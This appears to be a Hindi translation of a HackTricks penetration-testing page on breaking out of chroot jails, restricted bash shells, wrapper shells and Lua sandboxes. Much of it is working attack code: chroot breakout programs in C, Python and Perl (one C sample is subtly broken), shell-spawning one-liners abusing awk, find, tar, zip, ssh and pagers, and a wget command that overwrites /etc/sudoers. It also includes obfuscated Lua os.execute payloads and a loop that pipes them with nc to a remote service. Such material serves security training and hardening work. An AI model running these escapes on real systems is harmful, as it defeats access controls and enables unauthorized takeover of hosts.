# Jails से बाहर निकलना

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**[**https://gtfobins.github.io/**](https://gtfobins.github.io) **में खोजें कि क्या आप "Shell" property वाली किसी binary को execute कर सकते हैं**

## Chroot Escapes

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) से: chroot mechanism का उद्देश्य **privileged** (**root**) **users** द्वारा जानबूझकर की जाने वाली छेड़छाड़ से **बचाव करना नहीं है**। अधिकांश systems पर, chroot contexts ठीक से stack नहीं होते और **पर्याप्त privileges वाले chrooted programs बाहर निकलने के लिए दूसरा chroot कर सकते हैं**।\
आमतौर पर इसका अर्थ है कि escape करने के लिए आपको chroot के अंदर root होना आवश्यक है।

> [!TIP]
> **tool** [**chw00t**](https://github.com/earthquake/chw00t) को निम्नलिखित escenarios का दुरुपयोग करने और `chroot` से escape करने के लिए बनाया गया था।<sup>[[1]](#references)</sup>

### Root + CWD

> [!WARNING]
> यदि आप chroot के अंदर **root** हैं, तो आप **एक और chroot बनाकर escape कर सकते हैं**। ऐसा इसलिए है क्योंकि (Linux में) 2 chroots एक साथ मौजूद नहीं रह सकते। इसलिए यदि आप एक folder बनाते हैं और फिर उस नए folder पर **एक नया chroot बनाते हैं**, जबकि **आप उसके बाहर हैं**, तो अब आप **नए chroot के बाहर** होंगे और इसलिए FS में होंगे।
>
> ऐसा इसलिए होता है क्योंकि आमतौर पर chroot आपके working directory को बताए गए स्थान पर नहीं ले जाता, इसलिए आप chroot बना सकते हैं लेकिन उसके बाहर रह सकते हैं।

आमतौर पर आपको chroot jail के अंदर `chroot` binary नहीं मिलेगी, लेकिन आप एक binary को **compile, upload और execute कर सकते हैं**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> यह पिछले case के समान है, लेकिन इस case में **attacker current directory का एक file descriptor store करता है** और फिर **chroot को एक नए folder में create करता है**। अंत में, क्योंकि उसके पास **chroot के बाहर** उस **FD** का **access** है, वह इसे access करता है और **escape** कर जाता है।

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD को Unix Domain Sockets के माध्यम से पास किया जा सकता है, इसलिए:
>
> - एक child process (fork) बनाएँ
> - एक UDS बनाएँ ताकि parent और child आपस में बात कर सकें
> - child process में किसी अलग folder पर chroot चलाएँ
> - parent proc में ऐसे folder का FD बनाएँ जो नए child proc chroot के बाहर हो
> - UDS का उपयोग करके वह FD child procc को पास करें
> - child process उस FD पर chdir करे, और क्योंकि वह उसके chroot के बाहर है, वह jail से escape कर जाएगा

### Root + Mount

> [!WARNING]
>
> - root device (/) को chroot के अंदर किसी directory में mount करना
> - उस directory में chroot करना
>
> यह Linux में संभव है

### Root + /proc

> [!WARNING]
>
> - chroot के अंदर किसी directory में procfs mount करें (यदि यह पहले से मौजूद नहीं है)
> - ऐसे pid को खोजें जिसका root/cwd entry अलग हो, जैसे: /proc/1/root
> - उस entry में chroot करें

### Root(?) + Fork

> [!WARNING]
>
> - एक Fork (child proc) बनाएँ और FS में किसी अलग, अधिक अंदर स्थित folder पर chroot करके उस पर CD करें
> - parent process से उस folder को, जिसमें child process मौजूद है, children के chroot से पहले वाले folder में ले जाएँ
> - यह children process स्वयं को chroot के बाहर पाएगा

### ptrace

> [!WARNING]
>
> - पहले users अपने processes को स्वयं के process से debug कर सकते थे... लेकिन अब यह default रूप से संभव नहीं है
> - फिर भी, यदि यह संभव हो, तो आप किसी process में ptrace कर सकते हैं और उसके अंदर shellcode execute कर सकते हैं ([इस example को देखें](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace))।

## Bash Jails

### Enumeration

Jail के बारे में info प्राप्त करें:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### PATH में बदलाव करें

जाँचें कि क्या आप PATH env variable को modify कर सकते हैं<sup>[[2]](#references)</sup>।
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vim का उपयोग करना
```bash
:set shell=/bin/sh
:shell
```
### Pagers और help viewers

कई restricted environments में अभी भी **pagers** या **help viewers** उपलब्ध रहते हैं। आमतौर पर `PATH` को फिर से बनाने की कोशिश करने की तुलना में इनका दुरुपयोग करना अधिक तेज़ होता है।
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
यदि `git` उपलब्ध है, तो ध्यान रखें कि इसका help output आमतौर पर एक pager के माध्यम से जाता है:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Common GTFOBins one-liners

एक बार जब आपको पता चल जाए कि कौन-से binaries accessible हैं, तो पहले obvious shell spawners को test करें:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
यदि आप किसी allowed command में केवल **arguments inject** कर सकते हैं (इसे स्वतंत्र रूप से चलाने के बजाय), तो **GTFOArgs** भी जांचें।

### script बनाएं

जांचें कि क्या आप _/bin/bash_ को content के रूप में रखते हुए कोई executable file बना सकते हैं.
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH से bash प्राप्त करें

यदि आप ssh के माध्यम से access कर रहे हैं, तो अक्सर server से restricted login shell के बजाय कोई **अलग program** execute करने के लिए कह सकते हैं:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
यदि `ssh` स्थानीय रूप से अनुमत कुछ binaries में से एक है, तो याद रखें कि इसका **GTFOBin** के रूप में भी दुरुपयोग किया जा सकता है:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

आप, उदाहरण के लिए, sudoers फ़ाइल को overwrite कर सकते हैं
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

कुछ environments आपको plain `rbash` में नहीं, बल्कि **wrappers** जैसे `git-shell`, `rssh`, या `lshell` में ले जाते हैं:

- `git-shell` केवल server-side Git commands और `~/git-shell-commands/` के अंदर मौजूद किसी भी चीज़ को स्वीकार करता है। यदि वह directory मौजूद है, तो allowed custom actions की सूची देखने के लिए `help` चलाएँ। यदि आप वहाँ **write** कर सकते हैं, तो उस directory में रखा गया कोई भी executable reachable हो जाता है।<sup>[[3]](#references)</sup>
- `rssh` / `lshell` आम तौर पर केवल `scp`, `sftp`, `rsync`, या Git-style operations की अनुमति देते हैं। ऐसे मामलों में पहले **file write primitives** पर ध्यान दें: `authorized_keys`, कोई shell startup file, या helper script किसी writable location में upload करें और फिर `ssh -t ...` से reconnect करें।
- यदि wrapper केवल command line को filter करता है, तो reachable binaries की सूची बनाएँ और फिर **GTFOBins / GTFOArgs** पर pivot करें।

### Other tricks

यह भी जाँचें:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**यह page भी interesting हो सकता है:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Python jails से escape करने के tricks निम्नलिखित page में हैं:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

इस page में आप उन global functions को देख सकते हैं, जिनका access आपको lua के अंदर प्राप्त है: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
बिंदुओं का उपयोग किए बिना किसी library के **functions को call करने** की कुछ tricks:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
किसी library के functions की सूची बनाएँ:
```bash
for k,v in pairs(string) do print(k,v) end
```
ध्यान दें कि हर बार जब आप पिछले one liner को **different lua environment में execute करते हैं, तो functions का order बदल जाता है**। इसलिए यदि आपको किसी specific function को execute करना है, तो आप अलग-अलग lua environments को load करके और library के first function को call करके brute force attack कर सकते हैं:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Get interactive lua shell**: यदि आप limited lua shell के अंदर हैं, तो आप एक नया lua shell (और उम्मीद है कि unlimited) प्राप्त कर सकते हैं, इसे call करके:
```bash
debug.debug()
```
## संदर्भ

- [1] [Chw00t: विभिन्न Chroot Solutions से बाहर कैसे निकलें (Bucsay Balazs, DeepSec talk और slides)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [GNU Bash Reference Manual – Restricted Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Git Documentation](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
